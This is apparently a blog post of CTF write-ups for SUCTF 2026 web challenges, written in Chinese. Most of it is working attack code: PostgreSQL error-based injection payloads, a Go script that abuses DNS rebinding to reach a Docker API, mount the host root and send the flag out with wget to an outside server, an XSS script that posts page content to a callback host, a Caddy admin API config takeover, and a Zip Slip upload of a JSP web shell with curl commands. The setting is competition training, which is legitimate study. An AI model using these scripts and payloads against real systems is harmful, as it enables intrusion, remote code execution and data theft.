---
title: "SUCTF2026 Web 解出汇总"
description: "SUCTF 2026 Web方向比赛WP，整理解题思路、关键利用点和赛后复盘记录。"
pubDate: "2026-05-01"
updatedDate: "2026-05-01"
tags: ["CTF", "Web安全", "WP"]
cover: auto
coverAlt: "SUCTF2026 Web 解出汇总 的文章封面"
draft: false
---
## sqli

首先审计前端源码，
app.js中_s数组解码内容为
- `/api/sign`
- `/api/query`
- `POST`
- `content-type`
- `application/json`
- `crypto1.wasm`
- `crypto2.wasm`
后续发现前端有一个类似签名生成的过程，本质上是依靠参数q进行查询，所以直接尝试在浏览器中注入
首先单引号测试发现报错
ERROR: unterminated quoted string at or near "' LIMIT 20" (SQLSTATE 42601)
确定数据库为PostgreSQL
进一步测试
- `%`
- `_`
均返回全部内容，猜测是LIKE，
先测试waf：
- `or`
- `and`
- `union`
- `--`
- `/*`
- `;`
- `pg_sleep`
- `information_schema`
- `pg_read_file`
- `copy``
||可以正常是用所以测试语句：`'|| (select 1) ||'`
后续进行报错注入，利用int4的类型转换报错

`' || int4(version()) || '` 获得数据库版本  ERROR: invalid input syntax for type integer: "PostgreSQL 17.9 (Debian 17.9-1.pgdg13+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 14.2.0-19) 14.2.0, 64-bit" (SQLSTATE 22P02)

`' || int4(current_database()) || '` 获取库名`ctf` 

`' || int4(current_user) || '` 当前用户为`postgres`

利用`pg_class` 和 `pg_attribute`获取flag

`' || int4((SELECT relname FROM pg_class WHERE relkind='r' LIMIT 1 OFFSET 1)) || '`  `secrets`

`' || int4((SELECT attname FROM pg_attribute WHERE attrelid=(SELECT oid FROM pg_class WHERE relname='secrets' LIMIT 1) LIMIT 1 OFFSET 3)) || '`  获取列名，有如下列名

- `cmax`
- `cmin`
- `ctid`
- `flag`
- `id`
- `tableoid`
- `xmax`
- `xmin`

`' || int4((SELECT flag FROM secrets LIMIT 1)) || '`   获得flag，`SUCTF{P9s9L_!Nject!On_IS_3@$Y_RiGht}`

## uri

`http://101.245.108.250:10013/api/webhook`

可以自定义POST数据，同时通过DNS重绑定可以进入内网进行SSRF，通过rbndr进行dns重绑定`7f000001.72727272.rbndr.us`
在2375端口处找到了docker api，通过自定义POST数据可以与docker api进行交互，同时创建恶意容器再启动，然后把根目录挂载到/host中，最终readflag获取flag，最后外带数据，以下是ai写的脚本

```go
package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

const (
	API_URL       = "http://101.245.108.250:10013/api/webhook"
	REBIND_DOMAIN = "7f000001.72727272.rbndr.us"
	VPS_IP        = "47.118.26.222:8888"
)

type Payload struct {
	Url  string `json:"url"`
	Body string `json:"body"`
}

func sendRebindReq(targetUrl string, targetBody string, checkStr string) string {
	client := &http.Client{Timeout: 5 * time.Second}
	
	for i := 1; i <= 200; i++ {
		p := Payload{Url: targetUrl, Body: targetBody}
		b, _ := json.Marshal(p)

		req, _ := http.NewRequest("POST", API_URL, bytes.NewBuffer(b))
		req.Header.Set("Content-Type", "application/json")
		req.Close = true 

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		
		respBody, _ := ioutil.ReadAll(resp.Body)
		resp.Body.Close()
		s := string(respBody)

		if !strings.Contains(s, "blocked IP") && !strings.Contains(s, "connection refused") && !strings.Contains(s, "deadline exceeded") {
			if checkStr == "" || strings.Contains(s, checkStr) {
				// We need to be careful. The proxy returns things like:
				// {"message":"forwarded","target_status":201,"target_body":"{\"Id\":\"...\"}\n"}
				fmt.Printf("[+] 第 %d 次尝试响应: %s\n", i, s)
				return s
			}
		}
		time.Sleep(100 * time.Millisecond)
	}
	return ""
}

func main() {
	fmt.Printf("[*] 目标 VPS: %s\n", VPS_IP)
	
	fmt.Println("[*] 正在利用 DNS Rebinding 创建恶意 Docker 容器...")
	dockerCreateUrl := fmt.Sprintf("http://%s:2375/containers/create", REBIND_DOMAIN)
	dockerBody := `{
	  "Image": "alpine:latest",
	  "Cmd": ["sh", "-c", "wget --post-data=\"$(/host/readflag)\" http://` + VPS_IP + `"],
	  "HostConfig": {
	    "Binds": ["/:/host"]
	  }
	}`

	createResp := sendRebindReq(dockerCreateUrl, dockerBody, "Id")
	if createResp == "" {
		fmt.Println("[-] 容器创建失败，请重新运行。")
		return
	}

	// 修复 ID 提取逻辑：
	// Docker 返回的 JSON 是嵌套在 target_body 中的转义字符串，或者我们需要更精确的截取
	// 期望匹配模式: \"Id\":\"(64位十六进制)\"
	idToken := `\"Id\":\"`
	startIdx := strings.Index(createResp, idToken)
	if startIdx == -1 {
		// 可能是没有转义的引号
		idToken = `"Id":"`
		startIdx = strings.Index(createResp, idToken)
	}

	if startIdx == -1 {
		fmt.Println("[-] 无法在响应中找到容器 ID。")
		return
	}
	
	startIdx += len(idToken)
	endIdx := strings.Index(createResp[startIdx:], `\"`)
	if endIdx == -1 {
		endIdx = strings.Index(createResp[startIdx:], `"`)
	}

	if endIdx == -1 || endIdx > 64 {
		fmt.Println("[-] 容器 ID 提取异常。")
		return
	}

	containerId := createResp[startIdx : startIdx+endIdx]
	fmt.Printf("[+] 成功提取容器 ID: %s\n", containerId)

	fmt.Println("[*] 正在启动恶意容器触发外带...")
	dockerStartUrl := fmt.Sprintf("http://%s:2375/containers/%s/start", REBIND_DOMAIN, containerId)
	
	startResp := sendRebindReq(dockerStartUrl, "", "204")
	if startResp != "" {
		fmt.Println("[+] 容器启动成功！请检查 VPS。")
	} else {
		fmt.Println("[-] 启动指令可能已发出，但未捕捉到确认信息，请直接检查 VPS。")
	}
}
```

```
SUCTF{SsRF_tO_rC3_by_d0CkEr_15_s0_FUn}
```

## xss

简单测试发现search.php对搜索内容拼接到`<script>`标签下，存在xss漏洞，然后利用bot功能进行数据外带。

```
import re
import time
import urllib.parse

import requests

BASE_URL = "http://101.245.81.83:10003"
CALLBACK = "http://47.118.26.222:8888"
WAIT_SECONDS = 15


def csrf(html):
    m = re.search(r'_csrf" value="([^"]+)"', html)
    if not m:
        raise RuntimeError("csrf not found")
    return m.group(1)


def login_session():
    s = requests.Session()
    u = f"exp{int(time.time())}"
    p = "Passw0rd123456"

    r = s.get(f"{BASE_URL}/register.php", timeout=15)
    s.post(
        f"{BASE_URL}/register.php",
        data={"username": u, "password": p, "_csrf": csrf(r.text)},
        allow_redirects=False,
        timeout=15,
    )

    r = s.get(f"{BASE_URL}/login.php", timeout=15)
    r = s.post(
        f"{BASE_URL}/login.php",
        data={"action": "login", "username": u, "password": p, "_csrf": csrf(r.text)},
        allow_redirects=False,
        timeout=15,
    )
    if r.status_code != 302 or r.headers.get("Location") != "/":
        raise RuntimeError("login failed")
    return s


def submit_to_bot(s, target_url):
    r = s.get(f"{BASE_URL}/bot/", timeout=15)
    token = csrf(r.text)
    r = s.post(
        f"{BASE_URL}/bot/",
        data={"action": "visit", "url": target_url, "_csrf": token},
        allow_redirects=True,
        timeout=20,
    )
    m = re.search(r'<textarea[^>]*id="output"[^>]*>(.*?)</textarea>', r.text, re.DOTALL)
    return m.group(1).strip() if m else "NO_OUTPUT"


def build_payload_url():
    mark = f"m{int(time.time())}"
    post_url = f"{CALLBACK}/?step=index&mark={mark}"
    ping_url = f"{CALLBACK}/?step=ping&mark={mark}"
    js = (
        "fetch('/').then(r=>r.text()).then(t=>{"
        + f"fetch('{post_url}',{{method:'POST',mode:'no-cors',body:t}});"
        + f"new Image().src='{ping_url}&len='+encodeURIComponent(t.length);"
        + "})"
    )
    q = "x</script><script>" + js + "</script>"
    return f"http://127.0.0.1/search.php?q={urllib.parse.quote(q, safe='')}", mark


def main():
    s = login_session()
    xss_url, mark = build_payload_url()
    out = submit_to_bot(s, xss_url)
    print("[+] bot:", out)
    print("[+] wait:", WAIT_SECONDS)
    time.sleep(WAIT_SECONDS)
    print("[+] check your server logs")
    print(f"[+] marker: step=index&mark={mark}")
    print("[+] extract flag from POST body with: SUCTF\\{[^}]+\\}")


if __name__ == "__main__":
    main()
```

```
SUCTF{110110100}
```

## xss rev

同xss脚本

```
SUCTF{1101101010}
```

## thief

先扫盘发现/metrics路由，通过login次数推断可爆破
爆破弱密码，admin:1q2w3e
http://156.239.26.40:13333/api/datasources/列出数据源
| ID | 名称 | 类型 | URL | 用途 |
|----|------|------|-----|------|
| 3 | caddy-admin-api | infinity-datasource | `http://localhost:2019` | SSRF |
| 21 | CaddyAdmin | JSON API | `http://127.0.0.1:2019` | SSRF |
| 18 | exploit_ssrf | JSON API | `http://127.0.0.1:2019/config/` | SSRF |
| 33 | ssrf_caddy_tmp | JSON API | `http://127.0.0.1:2019/` | SSRF |
| **34** | **marcusolsson-json-datasource** | **JSON API** | **`http://localhost:2019`** | **最佳 SSRF** |
| 2 | caddy-ssrf | Prometheus | `http://localhost:2019` | SSRF |
| 4 | caddy-graphite | Graphite | `http://localhost:2019` | SSRF |
利用数据源代理功能`/api/datasources/proxy/:id/*`
随后使用CVE-2026-27589

最终脚本

```python
import requests, json, sys

TARGET = "http://156.239.26.40:13333"
USER, PASS = "admin", "1q2w3e"

s = requests.Session()

# Step 1: Login
print("[*] Logging in...")
r = s.post(f"{TARGET}/login", json={"user": USER, "password": PASS})
assert r.status_code == 200, f"Login failed: {r.text}"
print(f"[+] Logged in as {USER}")

# Step 2: Find JSON API datasource → localhost:2019 (Caddy Admin API)
print("[*] Finding SSRF datasource...")
ds_list = s.get(f"{TARGET}/api/datasources/").json()
ds_id = next(
    ds["id"] for ds in ds_list
    if "marcusolsson-json" in ds.get("type", "")
    and "2019" in ds.get("url", "")
    and ds["url"].rstrip("/").endswith("2019")
)
print(f"[+] Using datasource id={ds_id}")

# Step 3: Read current Caddy config (verify SSRF works)
print("[*] Reading Caddy config via SSRF...")
r = s.get(f"{TARGET}/api/datasources/proxy/{ds_id}/config/")
assert r.status_code == 200, f"SSRF failed: {r.status_code}"
print(f"[+] Current config: {r.text[:120]}...")

# Step 4: Overwrite Caddy config — add file_server for /root/
print("[*] Injecting file_server route into Caddy config...")
payload = {
    "apps": {"http": {"servers": {"srv0": {
        "listen": [":80"],
        "routes": [
            {
                "match": [{"path": ["/getflag/*"]}],
                "handle": [
                    {"handler": "rewrite", "strip_path_prefix": "/getflag"},
                    {"handler": "file_server", "root": "/root"},
                ],
            },
            {
                "handle": [{"handler": "reverse_proxy",
                            "upstreams": [{"dial": "127.0.0.1:3000"}]}],
            },
        ],
    }}}}
}
s.post(f"{TARGET}/api/datasources/proxy/{ds_id}/load", json=payload)

# Verify
cfg = s.get(f"{TARGET}/api/datasources/proxy/{ds_id}/config/").json()
assert "file_server" in json.dumps(cfg), "Config injection failed"
print("[+] Config modified successfully")

# Step 5: Read /root/flag
print("[*] Fetching flag...")
flag = requests.get(f"{TARGET}/getflag/flag").text.strip()
assert flag, "Empty response"
print(f"\n[+] FLAG: {flag}\n")
```

```
SUCTF{c4ddy_4dm1n_4p1_2019_pr1v35c}
```

## wms

先审一下web.xml，发现
		<servlet-name>restSpringMvc</servlet-name>
		<url-pattern>/rest/*</url-pattern>
因为是前台rce，随后审计spring-mvc.xml，看一下拦截器的认证机制
审计一下org.jeecgframework.core.interceptors.AuthInterceptor下的源码

```java
        String requestPath = ResourceUtil.getRequestPath(request);
        if (requestPath.matches("^rest/[a-zA-Z0-9_/]+$")) {
            return true;
        }
```
找到漏洞点，/rest/*下均可未授权访问

grep寻找文件上传，命令执行，反序列化操作发现CgformSqlController下的doMigrateIn下存在文件上传和解压操作，考虑上传一个含jsp木马的zip文件
发现路径直接拼接

```java
File targetFile = buildFile(directoryPath + File.separator + zipEntry.getName(), false);
                  os = new BufferedOutputStream(new FileOutputStream(targetFile));
```

找到利用链，参数传递的?号可以利用multipart/form-data 的特性绕过，当请求是 multipart/form-data 格式时，Spring MVC 的 request.getParameter("doMigrateIn") 不仅会查找 URL 查询参数，还会查找 multipart 表单中的普通字段，

```
POST /jeewms/rest/cgformSqlController HTTP/1.1  
Content-Type: multipart/form-data

[form field] doMigrateIn=                       
[form field] file=exploit.zip                      
```

最终利用
```python
import zipfile

shell_code = b'''<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) out.println(line);
}
%>'''

with zipfile.ZipFile('exploit.zip', 'w') as zf:
    zf.writestr('dummy.txt', 'dummy')       # 正常占位文件
    zf.writestr('../shell.jsp', shell_code)  # Zip Slip: 穿越到上级目录
```

```bash
curl -X POST "http://TARGET/jeewms/rest/cgformSqlController" \
  -F "doMigrateIn=" \
  -F "file=@exploit.zip;type=application/zip"
```

```bash
curl "http://TARGET/jeewms/shell.jsp" --data-urlencode "cmd=id"
```

最后还需要提权，find / -perm -4000 发现 /usr/bin/date 有 SUID 权限，利用data -f 泄露文件内容

```bash
curl "http://TARGET:PORT/jeewms/shell.jsp" --data-urlencode "cmd=date -f /30b5a132adc9/flag_2d630fb4 2>&1"
```

```bash
suctf{v3ry_e45y_uN4utHOrIZEd_rC3!_!aAA}
```

获得flag
